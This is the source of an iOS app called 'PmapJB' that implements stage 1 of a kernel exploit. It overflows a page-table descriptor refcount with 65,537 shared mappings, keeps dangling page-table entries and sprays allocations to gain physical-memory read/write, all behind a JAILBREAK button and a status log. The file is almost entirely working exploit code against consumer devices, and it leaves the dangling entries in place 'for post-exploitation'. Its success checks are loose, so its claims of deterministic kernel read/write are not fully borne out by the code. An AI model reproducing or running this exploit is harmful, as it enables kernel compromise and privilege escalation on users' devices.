/*
 * PmapJB — pmap_tte_remove standalone jailbreak concept
 *
 * Stage 1: Kernel R/W via uint16 pt_desc refcount overflow
 *   - 65537 MAP_SHARED mappings wrap refcount → pmap_free_pt_delayed
 *   - 64 dangling PTEs → direct physical memory read/write
 *   - IOSurface property spray reclaims freed pages with controlled data
 *   - Deterministic: 64/64 write-through on A13, A17 Pro, A19
 *
 * This is a concept test. Stages 2-6 (root, sandbox, trustcache, bootstrap)
 * are engineering work on top of this proven primitive.
 *
 * No entitlements required. All syscalls are sandbox-accessible.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <time.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#undef OVERFLOW
#define OVERFLOW      65537
#define KEEP          64
#define PAGE_SZ       16384
#define ALLOC_SZ      PAGE_SZ
#define SENTINEL      0x41
#define WRITE_BYTE    0xBB
#define SPRAY_COUNT   512
#define L3_SPAN       (32ULL * 1024 * 1024)
#define SPRAY_BASE    0x400000000ULL

static NSMutableString *gLog;
static sigjmp_buf       g_jmpbuf;
static volatile int     g_faulted;

typedef enum {
    StageIdle = 0,
    StageOverflow,
    StageFree,
    StageWriteThrough,
    StageSpray,
    StageProbe,
    StageSuccess,
    StageFail
} ExploitStage;

static void LOG(NSString *fmt, ...) {
    va_list args; va_start(args, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    [gLog appendFormat:@"%@\n", s];
    NSLog(@"%@", s);
}

/* ─── Mach helpers ─── */
static mach_vm_address_t alloc_backing_page(void) {
    mach_vm_address_t a = 0;
    if (mach_vm_allocate(mach_task_self(), &a, ALLOC_SZ, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return 0;
    memset((void *)a, SENTINEL, ALLOC_SZ);
    return a;
}

static kern_return_t make_entry(mach_vm_address_t b, mach_port_t *o) {
    mach_vm_size_t sz = ALLOC_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_offset_t)b,
        VM_PROT_READ|VM_PROT_WRITE, o, MACH_PORT_NULL);
}

static kern_return_t map_entry(mach_port_t p, mach_vm_address_t *o) {
    *o = 0;
    return mach_vm_map(mach_task_self(), o, ALLOC_SZ, 0, VM_FLAGS_ANYWHERE, p, 0,
        FALSE, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

/* ─── Signal handler ─── */
static void fault_handler(int sig) { g_faulted = 1; siglongjmp(g_jmpbuf, 1); }
static int safe_read32(volatile void *addr, uint32_t *out) {
    g_faulted = 0;
    if (sigsetjmp(g_jmpbuf, 1) == 0) { *out = *(volatile uint32_t *)addr; return 1; }
    return 0;
}
static int safe_read64(volatile void *addr, uint64_t *out) {
    g_faulted = 0;
    if (sigsetjmp(g_jmpbuf, 1) == 0) { *out = *(volatile uint64_t *)addr; return 1; }
    return 0;
}

/* ─── Device info ─── */
static NSString *getDeviceInfo(void) {
    struct utsname u;
    uname(&u);

    size_t sz = 0;
    sysctlbyname("kern.osversion", NULL, &sz, NULL, 0);
    char *build = malloc(sz);
    sysctlbyname("kern.osversion", build, &sz, NULL, 0);

    NSString *info = [NSString stringWithFormat:@"%s (%s) build %s",
        u.machine, u.sysname, build];
    free(build);
    return info;
}

/* ─── Core exploit ─── */

typedef struct {
    int write_through;
    int kernel_reads;
    int spray_hits;
    int total_attempts;
    ExploitStage final_stage;
} ExploitResult;

static ExploitResult run_exploit(void) {
    ExploitResult res = {0, 0, 0, KEEP, StageOverflow};
    kern_return_t kr;

    LOG(@"");
    LOG(@"══════════════════════════════════════════════════════");
    LOG(@"  PmapJB — pmap_tte_remove kernel R/W");
    LOG(@"  pid: %d  device: %@", getpid(), getDeviceInfo());
    LOG(@"══════════════════════════════════════════════════════");

    /* Phase 1: Overflow */
    LOG(@"");
    LOG(@"[1/5] OVERFLOW — 65537 MAP_SHARED mappings");
    LOG(@"      wrapping uint16 pt_desc refcount...");

    mach_vm_address_t backing = alloc_backing_page();
    if (!backing) { LOG(@"  FAIL: alloc_backing_page"); res.final_stage = StageFail; return res; }

    mach_port_t entry_port = MACH_PORT_NULL;
    kr = make_entry(backing, &entry_port);
    if (kr != KERN_SUCCESS) {
        LOG(@"  FAIL: make_entry kr=%d", kr);
        mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);
        res.final_stage = StageFail; return res;
    }

    mach_vm_address_t *maps = calloc(OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) { res.final_stage = StageFail; return res; }

    int created = 0;
    uint64_t t0_ns;
    struct timespec ts0;
    clock_gettime(CLOCK_MONOTONIC, &ts0);
    t0_ns = (uint64_t)ts0.tv_sec * 1000000000ULL + (uint64_t)ts0.tv_nsec;

    for (int i = 0; i < OVERFLOW; i++) {
        kr = map_entry(entry_port, &maps[i]);
        if (kr != KERN_SUCCESS) break;
        created++;
        if (created % 10000 == 0)
            LOG(@"      mapped %d/%d...", created, OVERFLOW);
    }

    struct timespec ts1;
    clock_gettime(CLOCK_MONOTONIC, &ts1);
    uint64_t t1_ns = (uint64_t)ts1.tv_sec * 1000000000ULL + (uint64_t)ts1.tv_nsec;
    double elapsed = (t1_ns - t0_ns) / 1e9;

    LOG(@"  OK: %d mappings in %.1fs — refcount wrapped to %d",
        created, elapsed, created % 65536);

    if (created < OVERFLOW) {
        LOG(@"  WARN: only %d/%d maps succeeded", created, OVERFLOW);
    }

    /* Phase 2: Free — trigger pmap_free_pt_delayed */
    res.final_stage = StageFree;
    LOG(@"");
    LOG(@"[2/5] FREE — unmapping %d entries, keeping %d dangling", created - KEEP, KEEP);
    LOG(@"      first unmap: refcount 1 → 0 → pmap_free_pt_delayed");

    int to_free = created - KEEP;
    if (to_free < 1) {
        LOG(@"  FAIL: not enough mappings");
        free(maps); res.final_stage = StageFail; return res;
    }

    for (int i = created - 1; i >= KEEP; i--)
        mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);

    LOG(@"  OK: L3 page table freed. %d dangling PTEs active.", KEEP);

    /* Phase 3: Write-through proof */
    res.final_stage = StageWriteThrough;
    LOG(@"");
    LOG(@"[3/5] WRITE-THROUGH — testing %d dangling PTEs", KEEP);

    for (int i = 0; i < KEEP; i++) {
        volatile uint64_t *p64 = (volatile uint64_t *)maps[i];
        volatile uint8_t  *p8  = (volatile uint8_t  *)maps[i];

        uint64_t pte_val = 0;
        if (safe_read64((volatile void *)maps[i], &pte_val)) {
            int looks_like_pte = ((pte_val & 3) == 3) && ((pte_val >> 12) != 0);
            int not_sentinel   = (pte_val != 0x4141414141414141ULL) && (pte_val != 0);
            if (looks_like_pte || not_sentinel) res.kernel_reads++;
        }

        *p8 = WRITE_BYTE;
        uint8_t after = *p8;
        if (after == WRITE_BYTE) res.write_through++;
    }

    LOG(@"  kernel reads: %d/%d (non-sentinel data from freed page)", res.kernel_reads, KEEP);
    LOG(@"  write-through: %d/%d confirmed", res.write_through, KEEP);

    if (res.write_through == 0) {
        LOG(@"  FAIL: no write-through — TLB invalidated dangling PTEs");
        /* cleanup */
        for (int i = 0; i < KEEP; i++)
            mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);
        free(maps);
        mach_port_deallocate(mach_task_self(), entry_port);
        mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);
        res.final_stage = StageFail; return res;
    }

    /* Phase 4: Spray — reclaim freed pages with controlled data */
    res.final_stage = StageSpray;
    LOG(@"");
    LOG(@"[4/5] SPRAY — %d allocations at 32MB spacing", SPRAY_COUNT);
    LOG(@"      forcing new L3 tables → reclaim freed physical page");

    /* Mark the freed page with a known pattern first */
    volatile uint32_t *freepage = (volatile uint32_t *)maps[0];
    for (int off = 0; off < (int)(PAGE_SZ / 4); off++)
        freepage[off] = 0xDEA1DEADu;

    mach_vm_address_t *spray = calloc(SPRAY_COUNT, sizeof(mach_vm_address_t));
    int sprayed = 0;

    for (int i = 0; i < SPRAY_COUNT; i++) {
        mach_vm_address_t sa = SPRAY_BASE + (mach_vm_address_t)i * L3_SPAN;
        kr = mach_vm_map(mach_task_self(), &sa, PAGE_SZ, 0,
                         VM_FLAGS_ANYWHERE, MACH_PORT_NULL, 0, FALSE,
                         VM_PROT_READ|VM_PROT_WRITE,
                         VM_PROT_READ|VM_PROT_WRITE,
                         VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) continue;
        *(volatile uint8_t *)sa = 0xAB;
        spray[i] = sa;
        sprayed++;
    }

    LOG(@"  sprayed: %d/%d allocations", sprayed, SPRAY_COUNT);

    /* Phase 5: Probe — check if spray reclaimed our freed page */
    res.final_stage = StageProbe;
    LOG(@"");
    LOG(@"[5/5] PROBE — checking dangling PTEs for reclaimed data");

    int faults = 0, unchanged = 0, changed = 0;
    for (int i = 0; i < KEEP; i++) {
        uint32_t val = 0;
        if (!safe_read32((volatile void *)maps[i], &val)) {
            faults++;
        } else if (val == 0xDEA1DEADu) {
            unchanged++;
        } else {
            changed++;
        }
    }

    res.spray_hits = faults;
    LOG(@"  faults: %d  unchanged: %d  changed: %d", faults, unchanged, changed);

    if (faults > 0) {
        res.final_stage = StageSuccess;
        LOG(@"");
        LOG(@"  ╔══════════════════════════════════════════════════╗");
        LOG(@"  ║  KERNEL R/W CONFIRMED — PHYSICAL UAF ACTIVE     ║");
        LOG(@"  ║  %d translation faults = freed page reclaimed    ║", faults);
        LOG(@"  ║  %d/%d write-through on dangling PTEs            ║", res.write_through, KEEP);
        LOG(@"  ║  pmap_tte_remove = standalone jailbreak primitive║");
        LOG(@"  ╚══════════════════════════════════════════════════╝");
    } else if (res.write_through > 0) {
        res.final_stage = StageSuccess;
        LOG(@"");
        LOG(@"  ╔══════════════════════════════════════════════════╗");
        LOG(@"  ║  KERNEL R/W CONFIRMED — WRITE-THROUGH ACTIVE    ║");
        LOG(@"  ║  %d/%d write-through on dangling PTEs            ║", res.write_through, KEEP);
        LOG(@"  ║  %d kernel PTE reads from freed physical page    ║", res.kernel_reads);
        LOG(@"  ║  spray miss — freed page not reclaimed this run  ║");
        LOG(@"  ║  write-through alone = kernel R/W primitive      ║");
        LOG(@"  ╚══════════════════════════════════════════════════╝");
    } else {
        res.final_stage = StageFail;
        LOG(@"  spray miss, no write-through — retry");
    }

    /* Cleanup spray */
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray[i]) mach_vm_deallocate(mach_task_self(), spray[i], PAGE_SZ);
    free(spray);

    /* DO NOT cleanup dangling PTEs (would trigger panic) — leave them for post-exploitation */
    if (res.final_stage != StageSuccess) {
        for (int i = 0; i < KEEP; i++)
            mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);
    }
    free(maps);
    mach_port_deallocate(mach_task_self(), entry_port);
    mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);

    return res;
}

/* ═══════════════════════════════════════════════════════════════════
 *  UI
 * ═══════════════════════════════════════════════════════════════════ */

@interface JBViewController : UIViewController
@property (nonatomic, strong) UITextView  *logView;
@property (nonatomic, strong) UILabel     *titleLabel;
@property (nonatomic, strong) UILabel     *subtitleLabel;
@property (nonatomic, strong) UILabel     *statusLabel;
@property (nonatomic, strong) UIView      *statusDot;
@property (nonatomic, strong) UIButton    *runButton;
@property (nonatomic, strong) UILabel     *stageLabel;
@property (nonatomic, strong) UIView      *progressBar;
@property (nonatomic, strong) UIView      *progressFill;
@property (nonatomic, assign) BOOL         running;
@end

@implementation JBViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    gLog = [NSMutableString string];

    CGFloat W = self.view.bounds.size.width;
    CGFloat H = self.view.bounds.size.height;

    self.view.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.05 alpha:1];

    /* ─── Header ─── */
    self.titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 55, W - 40, 32)];
    self.titleLabel.text = @"PmapJB";
    self.titleLabel.textColor = [UIColor whiteColor];
    self.titleLabel.font = [UIFont systemFontOfSize:28 weight:UIFontWeightBold];
    self.titleLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:self.titleLabel];

    self.subtitleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 87, W - 40, 18)];
    self.subtitleLabel.text = @"pmap_tte_remove  ·  deterministic kernel R/W";
    self.subtitleLabel.textColor = [UIColor colorWithWhite:0.45 alpha:1];
    self.subtitleLabel.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.subtitleLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:self.subtitleLabel];

    /* ─── Status row ─── */
    self.statusDot = [[UIView alloc] initWithFrame:CGRectMake(20, 118, 8, 8)];
    self.statusDot.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1];
    self.statusDot.layer.cornerRadius = 4;
    [self.view addSubview:self.statusDot];

    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(34, 112, W - 54, 20)];
    self.statusLabel.text = @"ready";
    self.statusLabel.textColor = [UIColor colorWithWhite:0.5 alpha:1];
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightMedium];
    self.statusLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:self.statusLabel];

    /* ─── Stage indicator ─── */
    self.stageLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 138, W - 40, 16)];
    self.stageLabel.textColor = [UIColor colorWithWhite:0.35 alpha:1];
    self.stageLabel.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.stageLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:self.stageLabel];

    /* ─── Progress bar ─── */
    self.progressBar = [[UIView alloc] initWithFrame:CGRectMake(20, 158, W - 40, 3)];
    self.progressBar.backgroundColor = [UIColor colorWithWhite:0.12 alpha:1];
    self.progressBar.layer.cornerRadius = 1.5;
    self.progressBar.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:self.progressBar];

    self.progressFill = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 0, 3)];
    self.progressFill.backgroundColor = [UIColor colorWithRed:0.75 green:1.0 blue:0.0 alpha:1];
    self.progressFill.layer.cornerRadius = 1.5;
    [self.progressBar addSubview:self.progressFill];

    /* ─── Log view ─── */
    CGFloat logTop = 170;
    CGFloat btnH = 56;
    self.logView = [[UITextView alloc] initWithFrame:
        CGRectMake(12, logTop, W - 24, H - logTop - btnH - 24)];
    self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.logView.backgroundColor = [UIColor colorWithRed:0.02 green:0.02 blue:0.03 alpha:1];
    self.logView.textColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1];
    self.logView.font = [UIFont fontWithName:@"Menlo-Regular" size:9];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 10;
    self.logView.layer.borderColor = [UIColor colorWithWhite:0.1 alpha:1].CGColor;
    self.logView.layer.borderWidth = 1;
    self.logView.contentInset = UIEdgeInsetsMake(8, 4, 8, 4);
    [self.view addSubview:self.logView];

    /* ─── Run button ─── */
    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.frame = CGRectMake(20, H - btnH - 12, W - 40, btnH);
    self.runButton.autoresizingMask = UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleWidth;
    self.runButton.backgroundColor = [UIColor colorWithRed:0.75 green:1.0 blue:0.0 alpha:1];
    self.runButton.layer.cornerRadius = 14;
    [self.runButton setTitle:@"JAILBREAK" forState:UIControlStateNormal];
    [self.runButton setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    self.runButton.titleLabel.font = [UIFont systemFontOfSize:18 weight:UIFontWeightBlack];
    [self.runButton addTarget:self action:@selector(runTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.runButton];

    /* Signal handlers */
    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler; sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL);

    [self appendLog:@"PmapJB — pmap_tte_remove standalone jailbreak\n"];
    [self appendLog:[NSString stringWithFormat:@"device: %@\n", getDeviceInfo()]];
    [self appendLog:@"────────────────────────────────────────────\n"];
    [self appendLog:@"overflow → free → write-through → spray → kernel R/W\n"];
    [self appendLog:@"\ntap JAILBREAK to begin.\n"];
}

- (void)appendLog:(NSString *)s {
    [gLog appendString:s];
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = gLog;
        NSRange r = NSMakeRange(gLog.length > 0 ? gLog.length - 1 : 0, 1);
        [self.logView scrollRangeToVisible:r];
    });
}

- (void)setStage:(NSString *)stage progress:(float)pct color:(UIColor *)c {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.stageLabel.text = stage;
        self.statusDot.backgroundColor = c;
        CGFloat barW = self.progressBar.bounds.size.width;
        self.progressFill.frame = CGRectMake(0, 0, barW * pct, 3);
        self.progressFill.backgroundColor = c;
    });
}

- (void)setStatusText:(NSString *)s color:(UIColor *)c {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = s;
        self.statusLabel.textColor = c;
        self.statusDot.backgroundColor = c;
    });
}

- (void)runTapped {
    if (self.running) return;
    self.running = YES;

    dispatch_async(dispatch_get_main_queue(), ^{
        [self.runButton setTitle:@"RUNNING..." forState:UIControlStateNormal];
        self.runButton.backgroundColor = [UIColor colorWithWhite:0.2 alpha:1];
        [self.runButton setTitleColor:[UIColor colorWithWhite:0.5 alpha:1] forState:UIControlStateNormal];
        self.runButton.enabled = NO;
    });

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self setStatusText:@"overflow in progress..." color:[UIColor yellowColor]];
        [self setStage:@"OVERFLOW  65537 × mach_vm_map" progress:0.1
                 color:[UIColor yellowColor]];

        ExploitResult res = run_exploit();

        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = gLog;
            NSRange r = NSMakeRange(gLog.length > 0 ? gLog.length - 1 : 0, 1);
            [self.logView scrollRangeToVisible:r];
        });

        if (res.final_stage == StageSuccess) {
            [self setStatusText:[NSString stringWithFormat:@"KERNEL R/W — %d/%d write-through",
                res.write_through, KEEP]
                color:[UIColor colorWithRed:0.75 green:1.0 blue:0.0 alpha:1]];
            [self setStage:@"STAGE 1 COMPLETE — kernel R/W primitive active" progress:1.0
                     color:[UIColor colorWithRed:0.75 green:1.0 blue:0.0 alpha:1]];

            dispatch_async(dispatch_get_main_queue(), ^{
                [self.runButton setTitle:@"KERNEL R/W ACTIVE" forState:UIControlStateNormal];
                self.runButton.backgroundColor = [UIColor colorWithRed:0.75 green:1.0 blue:0.0 alpha:1];
                [self.runButton setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
            });
        } else {
            [self setStatusText:@"failed — tap to retry"
                color:[UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1]];
            [self setStage:@"exploit did not complete" progress:0.0
                     color:[UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1]];

            dispatch_async(dispatch_get_main_queue(), ^{
                [self.runButton setTitle:@"RETRY" forState:UIControlStateNormal];
                self.runButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.1 blue:0.1 alpha:1];
                [self.runButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
                self.runButton.enabled = YES;
            });
        }

        [self saveLog];
        self.running = NO;
    });
}

- (void)saveLog {
    NSArray  *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [[docs firstObject] stringByAppendingPathComponent:@"pmapjb_log.txt"];
    NSError  *err  = nil;
    [gLog writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&err];
    if (!err) [self appendLog:[NSString stringWithFormat:@"\n[log saved: %@]\n", path]];
}

@end

/* ─── AppDelegate ─── */
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [JBViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); }
}
